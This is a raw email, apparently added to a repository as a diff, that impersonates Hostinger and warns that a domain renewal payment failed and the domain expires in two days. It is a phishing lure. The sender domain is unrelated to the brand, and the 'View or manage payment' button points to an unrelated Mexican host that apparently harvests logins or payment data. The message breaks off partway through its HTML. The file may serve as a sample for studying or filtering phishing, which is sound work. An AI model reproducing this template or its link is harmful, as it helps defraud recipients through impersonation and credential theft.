@@ -1,0 +1,506 @@
+Return-Path: <info.7rnyah3mvmweb@femas-hdf.fr>
+Delivered-To: hr@naukrimili.com
+Received: from md-ht-9.webhostbox.net
+	by md-ht-9.webhostbox.net with LMTP
+	id gHJtHdGDWGfagAkA332cTg
+	(envelope-from <info.7rnyah3mvmweb@femas-hdf.fr>)
+	for <hr@naukrimili.com>; Tue, 10 Dec 2024 23:39:21 +0530
+Return-path: <info.7rnyah3mvmweb@femas-hdf.fr>
+Envelope-to: hr@naukrimili.com
+Delivery-date: Tue, 10 Dec 2024 23:39:21 +0530
+Received: from bsmtp9.femas-hdf.fr ([148.113.26.61]:59223)
+	by md-ht-9.webhostbox.net with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96.2)
+	(envelope-from <info.7rnyah3mvmweb@femas-hdf.fr>)
+	id 1tL4fg-002rMX-0h
+	for hr@naukrimili.com;
+	Tue, 10 Dec 2024 23:39:21 +0530
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=1733609511.hdf; d=femas-hdf.fr;
+ h=From:To:Subject:Message-ID:Content-Transfer-Encoding:Date:MIME-Version:
+ Content-Type; i=info.7rnyah3mvmweb@femas-hdf.fr;
+ bh=dPR50nw4Q9cBJhKEn+kdnfGzVLpsHxT8Yd/ZOGozZFk=;
+ b=BtuF9X7usJvGomoOJpJI7Frs8fwMYNUQdgjq3KzSA58aRIRONdda4IAqSGQmbC+PrbYoDdcDc4D1
+   sQp2lDCNUOLQhElHSPkd7/dW4AMCfN1xS7MCmFZ8EaAH/LiZ4KzTgWSpMKvDo2S4Wlsomn6ESVeV
+   fRxIkmhUqtVQPFUGd+M=
+From: "Hostinger.com" <info.7rnyah3mvmweb@femas-hdf.fr>
+To: hr@naukrimili.com
+Subject: Action required - The Domain name will expire in the next 2 days. 
+Message-ID: <3d8f88fb-c082-f96b-2da9-a0055ba434ef@femas-hdf.fr>
+Content-Transfer-Encoding: quoted-printable
+Date: Tue, 10 Dec 2024 18:09:05 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+X-Spam-Status: No, score=-4.3
+X-Spam-Score: -42
+X-Spam-Bar: ----
+X-Spam-Flag: NO
+
+<HTML>
+<BODY><TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; =
+MAX-WIDTH: 600px; FONT-FAMILY: -apple-system, BlinkMacSystemFont, =
+"Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", =
+"Segoe UI Emoji", "Segoe UI Symbol"; WHITE-SPACE: normal; WORD-SPACING: =
+0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; =
+WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px" vAlign=3Dtop width=3D"100%" align=3Dcenter>
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; MAX-WIDTH: 600px; =
+FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe =
+UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI =
+Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; =
+PADDING-TOP: 0px; MARGIN: 0px" vAlign=3Dtop align=3Dleft>
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: =
+-apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, =
+sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; =
+BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; =
+WIDTH: 600px; PADDING-BOTTOM: 28px; PADDING-TOP: 36px; PADDING-LEFT: 0px; =
+MARGIN: 0px; PADDING-RIGHT: 0px" align=3Dleft><IMG class=3Dv1CToWUd =
+style=3D"BORDER-TOP-STYLE: none; BOX-SIZING: border-box; CURSOR: move; =
+BORDER-LEFT-STYLE: none; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none;=
+ BORDER-RIGHT-STYLE: none; DISPLAY: block"><IMG style=3D"BORDER-TOP-STYLE: =
+none; BOX-SIZING: border-box; BORDER-LEFT-STYLE: none; VERTICAL-ALIGN: =
+middle; BORDER-BOTTOM-STYLE: none; BORDER-RIGHT-STYLE: none" =
+src=3D"data:image/png;base64,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
+BJRU5ErkJggg=3D=3D" width=3D150></TD></TR>
+<TR style=3D"BOX-SIZING: =
+border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-TOP: 0px; MARGIN:=
+ 0px" vAlign=3Dtop align=3Dcenter><IMG style=3D"BORDER-TOP-STYLE: none; =
+BOX-SIZING: border-box; BORDER-LEFT-STYLE: none; VERTICAL-ALIGN: middle; =
+BORDER-BOTTOM-STYLE: none; BORDER-RIGHT-STYLE: none" =
+src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAlgAAAA3CAMAAADnhcRIAA=
+AAA3NCSVQICAjb4U/gAAAAElBMVEX3+Pr////0gEf4pHz6yK/+6+JnbuuvAAABY0lEQVR4nO3d3=
+Y6CMBCAUYX2/V95BdbVjhi6NBNjcs5l6YUXX8pE/LlcoEOZjpRPv0S+0WFX0/Tpl8g3EhYphEWK=
+f4d1hQ4dYTX7hUUXYZFCWKQQFimERQphkUJYpBAWKUJEpV5rfC7d7BcWXUJX61oRFqPahrZsLsJ=
+i1G5DwmJU21Bd16qwGGXGIkXb0LyuzcJilLBIMe1EtLd2Jyy6hIiW6b0Ki2EhomV6984740JEy5=
+A1C4thwiKFsEgRIrpN73F2FxYnxIp2NPuFRRdhkSLOWLdboRmLcSGipZv4tftmv7DoEg6sdc2zQ=
+oY5sUhhxiLFdKzZLyy6CIsUwiKFsEghLFIIixTCIoWwSCEsUgiLFMIihbBI8ZJRfAQtLM5omiq/=
+P2NUZmEx5tFPeW7m+Q8ym/3CosvfaVXDhcfHspplYdHlflztXCrC4rStnXhcbaqwOGu9Db6tZRY=
+W55T92+Dbyz/cgn0GhVwPfAAAAABJRU5ErkJggg=3D=3D" width=3D"100%"></TD></TR></T=
+BODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: =
+border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px; MARGIN: 0px" vAlign=3Dtop align=3Dcenter>
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: =
+-apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, =
+sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; =
+BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; =
+PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" vAlign=3Dtop =
+align=3Dcenter>
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; =
+MAX-WIDTH: 600px; FONT-FAMILY: -apple-system, BlinkMacSystemFont, =
+"Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", =
+"Segoe UI Emoji", "Segoe UI Symbol"; BORDER-COLLAPSE: collapse; =
+FONT-WEIGHT: 400; LINE-HEIGHT: normal; font-feature-settings: "liga" 0' =
+cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: =
+border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING:=
+ border-box; FONT-SIZE: 0px; MARGIN: 0px" vAlign=3Dtop align=3Dcenter>
+<DIV style=3D"BOX-SIZING: border-box; MAX-WIDTH: 100%; WIDTH: 600px; =
+VERTICAL-ALIGN: top; DISPLAY: inline-block; BACKGROUND-COLOR: white">
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; MAX-WIDTH: 500px; =
+FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe =
+UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI =
+Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; =
+FONT-SIZE: 30px; MARGIN: 0px; LETTER-SPACING: 0px; LINE-HEIGHT: 30px" =
+vAlign=3Dtop>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 24px; =
+FONT-WEIGHT: bold; COLOR: rgb(67,81,92); PADDING-BOTTOM: 0px; =
+LETTER-SPACING: normal"><FONT style=3D"BOX-SIZING: border-box; FONT-WEIGHT:=
+ 400" color=3D#000000 size=3D3><FONT style=3D"BOX-SIZING: border-box; =
+FONT-SIZE: 24px"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: =
+bolder">There Was a Problem with Your Renewal Payment</B></FONT></FONT>
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 24px; FONT-FAMILY: =
+-apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, =
+sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; =
+BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' align=3Dcenter>
+<TBODY =
+style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; =
+LINE-HEIGHT: normal">
+<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px">
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, =
+BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple=
+ Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; MARGIN: 0px 0px =
+1em'><FONT style=3D"BOX-SIZING: border-box; FONT-SIZE: =
+14px"></FONT>&nbsp;</P>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: =
+-apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, =
+sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; =
+MARGIN: 0px 0px 1em'></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: =
+16px; FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", =
+"Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", =
+"Segoe UI Symbol"; MARGIN: 0px 0px 1em'>1No. of Domain(s) under your =
+account expiring in the next 2 days.</P>
+<P style=3D'BOX-SIZING: =
+border-box; FONT-SIZE: 16px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", =
+"Segoe UI Emoji", "Segoe UI Symbol"; MARGIN: 0px 0px 1em'><SPAN =
+style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px">On expiry, the Domain(s) =
+will be deactivated and subsequently deleted. So please review the =
+Domain(s) below and renew, to ensure normal functioning.</SPAN></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: =
+-apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, =
+sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; =
+MARGIN: 0px 0px 1em'><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: =
+14px">List of expiring / expired Domain(s) under your account: Domain =
+name</SPAN></P>
+<UL style=3D"LIST-STYLE-TYPE: disc; BOX-SIZING: border-box;=
+ FONT-SIZE: 14px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: =
+16px; MARGIN: 1em 0px 1em 24px; PADDING-RIGHT: 0px">
+<LI style=3D"BOX-SIZING: border-box; MARGIN-BOTTOM: 0.5em; LINE-HEIGHT: =
+normal"><STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT: =
+600">Transaction Date:</STRONG><SPAN style=3D"BOX-SIZING: =
+border-box">&nbsp;10</SPAN>/12/2024</LI>
+<LI style=3D"BOX-SIZING: =
+border-box; MARGIN-BOTTOM: 0.5em; LINE-HEIGHT: normal"><STRONG =
+style=3D"BOX-SIZING: border-box; FONT-WEIGHT: 600">Transaction =
+Amount:</STRONG><SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>$ 11,=
+21</LI></UL>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system=
+, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, =
+"Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; MARGIN: 0px 0px =
+1em'></P>
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center"><A =
+style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; MIN-WIDTH: 94px; =
+COLOR: white; PADDING-BOTTOM: 12px; PADDING-TOP: 10px; PADDING-LEFT: 24px; =
+DISPLAY: inline-block; LINE-HEIGHT: 16px; PADDING-RIGHT: 24px; =
+BACKGROUND-COLOR: rgb(2,2,2); border-radius: 5px" href=3D"http://creealpha.=
+coinsmexico.com.mx/zsfyywsmf4" rel=3Dnoreferrer target=3D_blank><B =
+style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT =
+style=3D"BOX-SIZING: border-box" size=3D3>View or manage =
+payment</FONT></B></A></DIV>
+<DIV style=3D"BOX-SIZING: border-box; =
+TEXT-ALIGN: center"><BR style=3D"BOX-SIZING: border-box"></DIV>
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center">
+<TABLE id=3Dv1transactionDetails style=3D'BOX-SIZING: border-box; =
+FONT-SIZE: 13px; FONT-FAMILY: Arial, sans-serif; BORDER-COLLAPSE: collapse;=
+ FONT-WEIGHT: normal; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; =
+LINE-HEIGHT: normal; font-feature-settings: "liga" 0' cellSpacing=3D0 =
+cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TD style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; PADDING-BOTTOM:=
+ 25px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 35px; =
+PADDING-RIGHT: 35px">
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: =
+13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", =
+"Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", =
+"Segoe UI Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; =
+LINE-HEIGHT: normal; font-feature-settings: "liga" 0' cellSpacing=3D0 =
+cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TD class=3Dv1xmprfx_xmprfx_ppsans style=3D"BOX-SIZING: border-box; =
+VERTICAL-ALIGN: top; OUTLINE-WIDTH: medium; PADDING-TOP: 25px; =
+OUTLINE-STYLE: none" align=3Dcenter>
+<TABLE style=3D'BOX-SIZING: =
+border-box; FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", =
+"Segoe UI Emoji", "Segoe UI Symbol"; BORDER-COLLAPSE: collapse; =
+FONT-WEIGHT: 400; LINE-HEIGHT: normal; font-feature-settings: "liga" 0' =
+cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: =
+none">
+<TD style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; =
+PADDING-BOTTOM: 20px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: =
+25px; PADDING-RIGHT: 25px">
+<TABLE style=3D'BOX-SIZING: border-box; =
+FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica=
+ Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI =
+Emoji", "Segoe UI Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; =
+LINE-HEIGHT: normal; font-feature-settings: "liga" 0' cellSpacing=3D0 =
+cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TD style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; PADDING-BOTTOM:=
+ 20px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 25px; =
+PADDING-RIGHT: 25px">
+<TABLE id=3Dv1cartDetails style=3D'BOX-SIZING: =
+border-box; FONT-SIZE: 14px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", =
+"Segoe UI Emoji", "Segoe UI Symbol"; BORDER-COLLAPSE: collapse; =
+FONT-WEIGHT: 400; LINE-HEIGHT: normal; font-feature-settings: "liga" 0' =
+dir=3Dltr cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; =
+OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none">
+<TD style=3D"BOX-SIZING: border-box; =
+BORDER-TOP: 0px; WIDTH: 240px; VERTICAL-ALIGN: top; OUTLINE-WIDTH: medium; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: =
+10px; PADDING-RIGHT: 10px">
+<TABLE style=3D'BOX-SIZING: border-box; =
+FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica=
+ Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI =
+Emoji", "Segoe UI Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; =
+LINE-HEIGHT: normal; font-feature-settings: "liga" 0' cellSpacing=3D0 =
+cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TD class=3Dv1xmprfx_xmprfx_ppsans style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; PADDING-BOTTOM: 20px; PADDING-TOP: 0px; =
+OUTLINE-STYLE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<P class=3Dv1xmprfx_xmprfx_ppsans style=3D'BOX-SIZING: border-box; =
+FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe =
+UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI =
+Symbol"; MARGIN: 0px 0px 1em' dir=3Dltr><FONT style=3D"BOX-SIZING: =
+border-box" size=3D2><FONT style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none"><STRONG style=3D"BOX-SIZING: border-box; =
+FONT-WEIGHT: bolder; OUTLINE-WIDTH: medium; OUTLINE-STYLE: =
+none">Transaction</STRONG></FONT><BR style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">834046318590774784289854</FONT>=
+</P></TD></TR></TBODY></TABLE></TD>
+<TD style=3D"BOX-SIZING: border-box; =
+BORDER-TOP: 0px; WIDTH: 240px; VERTICAL-ALIGN: top; OUTLINE-WIDTH: medium; =
